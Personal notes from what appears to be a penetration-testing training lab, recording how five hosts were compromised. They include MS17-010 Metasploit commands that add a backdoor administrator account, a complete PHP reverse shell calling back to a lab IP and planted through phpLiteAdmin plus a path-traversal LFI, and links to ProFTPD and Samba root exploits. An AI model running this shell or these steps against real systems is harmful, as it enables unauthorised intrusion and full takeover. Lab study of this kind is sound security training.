10.11.1.128 (DJ) 
=======================================================================================================================
MSSQL Injection in webpage: Spaces in query cause errors. Need to use "+"'s to get queries working. 
Good resource: https://www.exploit-db.com/papers/12975


10.11.1.75 (Bruce)
=======================================================================================================================
Need to use MS17-010 
SMB allows anon authentication
zzz_exploit did not work
send_and_execute.py needed to be modified to put root : pass as creds even though anon is allowed, smb just needed some chars to login
send_and_execute finds netlogon as the named pipe
AutoBlue programs did not work
MSF was used, and windows/smb/ms17_010_psexec was used to issue SYSTEM commands. 
    set payload windows/x64/exec
    set cmd net user newadmin password /add
    exploit --> Makes a new user named newadmin : password
    set cmd net localgroup "administrators" newadmin /add 
    exploit --> Adds newadmin to administrators group    
Once the new user is created, rdesktop to machine and login as newadmin 
To get NT AUTHORITY\SYSTEM, used meterpreter with getsystem command


10.11.1.116 (Dotty)
=======================================================================================================================
Box is FreeBSD
Found /db/phpliteadmin webdir
Password is admin
Exploit is same as HTB Nineveh 
Able to make a db named hack.php, then make table with type TEXT with default value of:
<?php set_time_limit (0); $VERSION = "1.0"; $ip = "10.11.0.162"; $port = 12345; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\n"; } } ?>
Finding /administrator/alerts/alertConfigField.php allows LFI
/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../usr/local/databases/hack.php opens shell
Root is gained by kernel exploit. Used “fetch” to get it instead of wget 


10.11.1.146 (Susie)
=======================================================================================================================
Found ProFTPD 1.3.3a Server running on port 21
Used exploit: https://github.com/ankh2054/python-exploits/blob/master/protfpd_exploit.py to get root


10.11.1.22 (Barry)
=======================================================================================================================
Used auxiliary/scanner/smb/smb_version to id samba as Samba 2.2.3a 
Used  https://www.exploit-db.com/exploits/7 to get root 



























